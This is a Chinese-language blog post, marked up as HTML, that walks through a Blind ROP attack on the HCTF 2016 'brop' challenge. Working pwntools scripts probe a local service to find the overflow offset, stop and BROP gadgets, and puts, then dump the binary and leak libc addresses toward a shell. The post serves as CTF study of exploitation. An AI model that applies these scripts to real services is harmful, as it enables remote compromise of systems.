@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="受到之前 HITCON 有一場由 angelboy 主講的議程影響
+意外的發現 BROP 這個手法，BROP 全名為 Blind Return Oriented Programming (BROP)一直以來打 rop 都是在有 binary 的前提下進行研究與攻擊的，所以像這種打 blind 的手法較少見，也讓我吃了一點苦頭
+打 BROP 有幾個前提─binary 記憶體不會被 ASLR，canary 不會一直 random(這邊是關掉的)
+事不宜遲直接開始
+ HCTF 2016- brop 
+
+這邊主要拿 HCTF 2016 - brop 作為練習，相關資料參考在這裡https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html題目在這裡https://github.com/zh-explorer/hctf2016-brop
+為了求真實，這邊一樣以未取得 binary 僅得知 ip/port 的方式進行攻擊
+1234567#!/bin/shwhile true; do        num=`ps -ef | grep &amp;quot;socat&amp;quot; | grep -v &amp;quot;grep&amp;quot; | wc -l`        if [ $num -lt 5 ]; then                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out &amp;amp;        fidone
+執行起來的狀況:">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="AStar">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="BROP"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="AStar&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+        <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>BROP - AStar&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">AStar</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tags">
+                            
+                                Tags
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories">
+                            
+                                Categories
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>BROP</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2022-11-07
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+                    
+                        
+
+
+<a href="/tags/pwn/">#pwn</a>
+
+
+                    
+                </div>
+                <div class="col-lg-4 col-md-5 post-categories">
+                    
+                </div>
+            
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>受到之前 HITCON 有一場由 angelboy 主講的議程影響</p>
+<p>意外的發現 BROP 這個手法，BROP 全名為 <code>Blind Return Oriented Programming (BROP)</code><br>一直以來打 rop 都是在有 binary 的前提下進行研究與攻擊的，所以像這種打 blind 的手法較少見，也讓我吃了一點苦頭</p>
+<p>打 BROP 有幾個前提─binary 記憶體不會被 ASLR，canary 不會一直 random(這邊是關掉的)</p>
+<p>事不宜遲直接開始</p>
+<h1> HCTF 2016- brop </h1>
+
+<p>這邊主要拿 <code>HCTF 2016 - brop</code> 作為練習，相關資料參考在這裡<br><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html</a><br>題目在這裡<br><a target="_blank" rel="noopener" href="https://github.com/zh-explorer/hctf2016-brop">https://github.com/zh-explorer/hctf2016-brop</a></p>
+<p>為了求真實，這邊一樣以未取得 binary 僅得知 ip/port 的方式進行攻擊</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">        num=`ps -ef | grep <span class="string">&quot;socat&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | wc -l`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$num</span> -lt 5 ]; <span class="keyword">then</span></span><br><span class="line">                socat tcp4-listen:10001,reuseaddr,fork <span class="built_in">exec</span>:./a.out &amp;</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>執行起來的狀況:</p>
+<p><img src="/img/2022/BROP/BROP_hctf_1.png" alt=""></p>
+<h3>Finding Offset</h3>
+
+<p>首先第一步─取得 overflow 的 offset</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_overflowi_offset</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cyclic = <span class="string">b&quot;a&quot;</span>*i</span><br><span class="line">            buf_size = <span class="built_in">len</span>(cyclic)</span><br><span class="line">            log.info(<span class="string">&quot;trying buffer size: %d&quot;</span> %buf_size)</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">            io.recvline()</span><br><span class="line">            io.send(cyclic)</span><br><span class="line">            io.recvline()</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;found overflow offset: %d&quot;</span> %(buf_size-<span class="number">1</span>)) <span class="comment"># overflow offset</span></span><br><span class="line">            <span class="keyword">return</span> (buf_size-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">get_overflowi_offset()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/2022/BROP/BROP_hctf_2.png" alt=""></p>
+<h3>Finding Stop Gadget</h3> 
+
+<p>第二步需要取得不會 crash，能使程式正常退出的 address，用來當作正常退出的記號，在後續的攻擊會需要用到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">found_vaild_address</span>(<span class="params">overflow_size</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span> <span class="comment"># init address</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span>*overflow_size <span class="comment"># overflow offset</span></span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        log.info(<span class="string">&quot;trying address: %x&quot;</span> %addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.recvline()</span><br><span class="line">            time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            io.recvline()</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;vaild address: %x&quot;</span> %addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            log.info(<span class="string">&quot;KeyboardInterrupt caught&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">130</span>)</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;fail, try header&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> PwnlibException:</span><br><span class="line">            log.error(<span class="string">&quot;Can&#x27;t connect to server&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.error(e)</span><br><span class="line"></span><br><span class="line">found_vaild_address(<span class="number">72</span>)</span><br></pre></td></tr></table></figure>
+<p>這邊通常都是拿 no PIE 的 base address <code>0x400000</code> 當作尋找的起點，然後顧全網路連線的延遲，所以都會留下 sleep 的時間<br><img src="/img/2022/BROP/BROP_hctf_3.png" alt=""></p>
+<h3>Finding Brop Gadget</h3>
+
+<p>再來就是找 csu 的 gadget，眾所皆知 csu 上面有很多好用的 gadget，其中包括 rop 很常用到的 <code>pop rdi;ret</code><br>這邊的尋找的邏輯跟找 stop gadget 差不多，並且 base address 可以以 stop gadget 為初始點下去找，因為 csu 的 gadget 基本上都會在最下面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">found_brop_gadget</span>(<span class="params">stop_address ,overflow_size</span>):</span></span><br><span class="line">    addr = stop_address</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span>*overflow_size <span class="comment"># overflow offset</span></span><br><span class="line">        payload += flat([addr, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, stop_address])</span><br><span class="line">        log.info(<span class="string">&quot;trying address: %x&quot;</span> %addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;possible address: %x&quot;</span> %addr)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                check_payload = <span class="string">b&quot;a&quot;</span>*overflow_size <span class="comment"># overflow offset</span></span><br><span class="line">                check_payload += flat([addr, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line">                time.sleep(<span class="number">0.5</span>) <span class="comment"># wait time</span></span><br><span class="line">                io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">                io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">                io.sendline(check_payload)</span><br><span class="line">                io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                log.info(<span class="string">&quot;not brop address&quot;</span>)</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                log.info(<span class="string">&quot;find brop address: %x&quot;</span> %addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            log.info(<span class="string">&quot;KeyboardInterrupt caught&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">130</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            io.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            log.info(<span class="string">&quot;fail, try header&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> PwnlibException:</span><br><span class="line">            log.error(<span class="string">&quot;Can&#x27;t connect to server&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.error(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">            log.error(e)</span><br><span class="line"></span><br><span class="line">found_brop_gadget(<span class="number">0x400545</span>, <span class="number">72</span>)</span><br></pre></td></tr></table></figure>
+<p>我特別在 <code>recvline</code> 加上了 timeout 的參數，這樣防止它跳到 scanf 或是 read 等等的 function address 的時候能繼續執行下去<br>另外可以看到我除了要確保他是 vaild address 之外，在 check 那邊還故意丟了 9 個 invaild address，如果他真的是 csu gadget 的話那 pop 完之後會 return 到 invaild address 導致 crash<br>這樣就能確定它是 csu gadget 了<br><img src="/img/2022/BROP/BROP_hctf_4.png" alt=""><br>因為有 binary，可以做 double check<br><img src="/img/2022/BROP/BROP_hctf_4-1.png" alt=""></p>
+<h3>Finding Puts</h3><br>下一步我們需要找到能 leak address 的位址，因為題目一開始就 print 字串了，所以可以合理懷疑有用到 <code>puts</code><br>由於是 blind，所以部分還是得用猜的去做<br><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">found_leak_gadget</span>(<span class="params">addr, pop_rdi_ret , ELF_address ,overflow_size</span>):</span></span><br><span class="line">    pop_rdi_ret_gadget = pop_rdi_ret</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span>*overflow_size <span class="comment"># overflow offset</span></span><br><span class="line">        payload += flat([pop_rdi_ret_gadget, ELF_address, addr])</span><br><span class="line">        log.info(<span class="string">&quot;trying address: %x&quot;</span> %addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            recv_string = io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">if</span> recv_string.startswith(<span class="string">b&quot;\x7fELF&quot;</span>):</span><br><span class="line">                log.info(<span class="string">&quot;find puts address: 0x%x&quot;</span> %addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            log.info(<span class="string">&quot;KeyboardInterrupt caught&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">130</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            io.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            log.info(<span class="string">&quot;fail, try header&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> PwnlibException:</span><br><span class="line">            log.error(<span class="string">&quot;Can&#x27;t connect to server&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.error(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">            log.error(e)</span><br><span class="line"></span><br><span class="line">found_leak_gadget(<span class="number">0x400000</span>, <span class="number">0x400793</span>, <span class="number">0x400000</span>, <span class="number">72</span>)</span><br></pre></td></tr></table></figure><br>這邊撰寫的邏輯是將 <code>rdi</code> 固定設定為程式的開頭，也就是 <code>0x400000</code>，然後開始往下尋找，只要成功找到 puts 的話就會把程式的 header 輸出出來<br><img src="/img/2022/BROP/BROP_hctf_5.png" alt=""><br><br><h3>Dumping ELF</h3><br>最後就是靠著上一步拿到的 <code>puts</code> address 來 leak binary<br><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_binary</span>(<span class="params">start_address, end_address, pop_rdi_ret, leak_gadget, overflow_size, stop_gadget</span>):</span></span><br><span class="line">    <span class="keyword">while</span> start_address &lt;= end_address:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span>*overflow_size <span class="comment"># overflow offset</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(start_address))</span><br><span class="line">        payload += flat([pop_rdi_ret, start_address, leak_gadget, stop_gadget])</span><br><span class="line">        result = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">            <span class="comment">#io = process(&quot;./a.out&quot;)</span></span><br><span class="line">            io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>) <span class="comment"># wait time</span></span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            recv_string = io.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> recv_string == <span class="string">b&#x27;\n&#x27;</span>:</span><br><span class="line">                recv_string = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> recv_string[-<span class="number">1</span>:] == <span class="string">b&#x27;\n&#x27;</span>:</span><br><span class="line">                recv_string = recv_string[:-<span class="number">1</span>] + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">            result += recv_string</span><br><span class="line">            start_address += <span class="built_in">len</span>(result)</span><br><span class="line">            ff = <span class="built_in">open</span>(<span class="string">&quot;leak.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>)</span><br><span class="line">            ff.write(result)</span><br><span class="line">            ff.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            log.info(<span class="string">&quot;KeyboardInterrupt caught&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">130</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            log.info(<span class="string">&quot;fail, try header&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> PwnlibException:</span><br><span class="line">            log.error(<span class="string">&quot;Can&#x27;t connect to server&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.error(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">            log.error(e)</span><br><span class="line">leak_binary(<span class="number">0x400000</span>, <span class="number">0x600000</span>,<span class="number">0x400793</span>, <span class="number">0x400545</span>, <span class="number">72</span>, <span class="number">0x400545</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/img/2022/BROP/BROP_hctf_6.png" alt=""><br><br>看起來應該是到 0x401000 位址就好然後我忘了針對 exception error 得後續處理，但 pwntool 有內建的處理所以還好<br>至於 leak 下來的 binary 該怎麼處理<br>我看網路上其他人有的用 IDA 修復 binary 解出 puts 的 GOT<br>這邊是採用免費的做法，用 r2 來解<br><img src="/img/2022/BROP/BROP_hctf_7.png" alt=""><br><img src="/img/2022/BROP/BROP_hctf_8.png" alt=""><br>這樣就拿到 plt 對應的 got address 了<br><br><h3>Making ROP Chain and Get Shell</h3>
+
+<p>只要簡單的寫一隻 overflow leak 的腳本就可以獲得 got 裡面的 libc address 了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">read_got = <span class="number">0x601028</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400793</span></span><br><span class="line">leak = <span class="number">0x400545</span></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">72</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(leak)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/2022/BROP/BROP_hctf_9.png" alt=""></p>
+<p>基本上可以用 libc-database 等等的網站就可以知道 libc 的版本與對應的 offset<br><a target="_blank" rel="noopener" href="https://libc.rip/">https://libc.rip/</a></p>
+<p>最後的流程是這樣<br><code>leak puts libc address and return to main -&gt; get libc base address -&gt; get system &amp; /bin/sh address -&gt; overflow again and get shell</code></p>
